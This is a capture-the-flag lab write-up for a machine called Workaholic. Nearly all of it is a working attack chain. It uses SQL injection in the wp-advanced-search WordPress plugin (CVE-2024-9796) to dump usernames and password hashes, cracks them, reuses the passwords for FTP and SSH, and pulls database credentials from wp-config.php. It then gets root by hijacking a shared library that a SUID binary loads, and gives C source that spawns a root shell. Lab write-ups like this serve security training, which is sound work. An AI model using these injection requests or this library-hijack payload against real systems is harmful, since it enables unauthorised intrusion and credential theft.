##### Tags: `SUID`  `wp-monitor`  `gcc`  `passwd-reuse` 

# 🐧Workaholic🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.216.229           

21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
port 21 running ftp but no credential to login  
port 80 is a webpage running wordpress  
use wpscan and found there is a wp-advanced-search vulnerabitiy
```console
$ wpscan --url http://workaholic.offsec/ --no-update
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://workaholic.offsec/ [192.168.216.229]
[+] Started: Sat Feb 21 17:48:24 2026

[+] wp-advanced-search
 | Location: http://workaholic.offsec/wp-content/plugins/wp-advanced-search/
 | Last Updated: 2025-09-10T09:36:00.000Z
 | [!] The version is out of date, the latest version is 3.3.9.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 3.3.8 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://workaholic.offsec/wp-content/plugins/wp-advanced-search/readme.txt
```
search google and found is CVE-2024-9796  
it does not sanitize and escape the t parameter before using it in a SQL statement 
https://github.com/RandomRobbieBF/CVE-2024-9796  
we got three users
```console
$ curl "http://workaholic.offsec/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20--&f=user_login&type=&e" 
admin
charlie
ted
```
three password hashes
```console
$ curl "http://workaholic.offsec/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20--&f=user_pass&type=&e"
$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.
$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.
$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/
```
use john to crack the hashes  
we got two passwords
```console
chrish20
okadamat17
```
use it to try to log into ftp  
and found ted okadamat17 is the vaild credential
```
$ ftp 192.168.216.229
Connected to 192.168.216.229.
220 (vsFTPd 3.0.5)
Name (192.168.216.229:ming): ted
331 Please specify the password.
Password: okadamat17
230 Login successful.
```
check the config file
```console
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1002     1002          405 Mar 27  2025 index.php
-rwxr-xr-x    1 1002     1002        19915 Mar 27  2025 license.txt
-rwxr-xr-x    1 1002     1002         7409 Mar 27  2025 readme.html
-rwxr-xr-x    1 1002     1002         7387 Mar 27  2025 wp-activate.php
drwxr-xr-x    9 1002     1002         4096 Mar 27  2025 wp-admin
-rwxr-xr-x    1 1002     1002          351 Mar 27  2025 wp-blog-header.php
-rwxr-xr-x    1 1002     1002         2323 Mar 27  2025 wp-comments-post.php
-rwxr-xr-x    1 1002     1002         3336 Mar 27  2025 wp-config-sample.php
-rwxr-xr-x    1 1002     1002         3178 Mar 27  2025 wp-config.php
drwxr-xr-x    5 1002     1002         4096 Mar 27  2025 wp-content
-rwxr-xr-x    1 1002     1002         5617 Mar 27  2025 wp-cron.php
drwxr-xr-x   30 1002     1002        12288 Mar 27  2025 wp-includes
-rwxr-xr-x    1 1002     1002         2502 Mar 27  2025 wp-links-opml.php
-rwxr-xr-x    1 1002     1002         3937 Mar 27  2025 wp-load.php
-rwxr-xr-x    1 1002     1002        51367 Mar 27  2025 wp-login.php
-rwxr-xr-x    1 1002     1002         8543 Mar 27  2025 wp-mail.php
-rwxr-xr-x    1 1002     1002        29032 Mar 27  2025 wp-settings.php
-rwxr-xr-x    1 1002     1002        34385 Mar 27  2025 wp-signup.php
-rwxr-xr-x    1 1002     1002         5102 Mar 27  2025 wp-trackback.php
-rwxr-xr-x    1 1002     1002         3246 Mar 27  2025 xmlrpc.php
226 Directory send OK.
```
we got the password
```console
/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'rU)tJnTw5*ShDt4nOx' );
```
use it to try to log into port 22 ssh  
charlie with rU)tJnTw5*ShDt4nOx is a vaild credential
```console
$ ssh charlie@192.168.216.229  
charlie@192.168.216.229's password: rU)tJnTw5*ShDt4nOx

charlie@workaholic:~$ id
uid=1001(charlie) gid=1001(charlie) groups=1001(charlie)
```

## Privilege Escalation

there is a unusual SUID file wp-monitor
```console
charlie@workaholic:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount3
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/var/www/html/wordpress/blog/wp-monitor
```
it is owned by root
```console

charlie@workaholic:~$ ls -la /var/www/html/wordpress/blog/wp-monitor
-rwsr-xr-x 1 root root 16728 Mar 27  2025 /var/www/html/wordpress/blog/wp-monitor
```
we can run it  
it looks like running the file of /home/ted/.lib/libsecurity.so  
and look for init_plugin
```console
charlie@workaholic:~$ strings /var/www/html/wordpress/blog/wp-monitor

/var/log/nginx/access.log
Error opening log file
%s - - [%*[^]]] "%s %s %s" %s
POST /wp-login.php
[Warning] Possible brute force attack detected: %s
[+] Checking the logs...
/home/ted/.lib/libsecurity.so
[!] This can take a while...
init_plugin
[!] Function not found in the library!
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
Scrt1.o
__abi_tag
```
lets su back to ted and check the file  
and it turned out thats not exist
```console
ted@workaholic:/home/ted$ ls -la
total 28
drwxrwxrwx 4 ted  ted  4096 Feb 21 09:41 .
drwxr-xr-x 5 root root 4096 Mar 27  2025 ..
lrwxrwxrwx 1 root root    9 Mar 27  2025 .bash_history -> /dev/null
-rw-r--r-- 1 ted  ted   220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 ted  ted  3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 ted  ted   807 Mar 31  2024 .profile
drwxr-xr-x 5 ted  ted  4096 Feb 21 09:27 shared
```
so the plan is we owned the directory and we can create a file named the same as /home/ted/.lib/libsecurity.so  
and put out malicious code in to get the root shell  
```console
ted@workaholic:/home/ted$ mkdir .lib
```
since the file is looking for c  
we create a c script and compile to run it in the target machine
```console
$ cat exploit.c           
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init_plugin() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
compile it and rename it to match the script
```console
gcc -shared -o libsecurity.so -fPIC exploit.c      
```
upload to the target machine
```console
ted@workaholic:/home/ted/.lib$ ls -la
drwxrwxr-x 2 ted ted  4096 Feb 21 09:57 .
drwxrwxrwx 4 ted ted  4096 Feb 21 09:41 ..
-rw-rw-r-- 1 ted ted 15480 Feb 21 09:56 libsecurity.so
```
run the wp-monitor and we got root
```console
ted@workaholic:/home/ted/.lib$ /var/www/html/wordpress/blog/wp-monitor
[+] Checking the logs...
root@workaholic:/home/ted/.lib# id
uid=0(root) gid=0(root) groups=0(root),1002(ted)
```
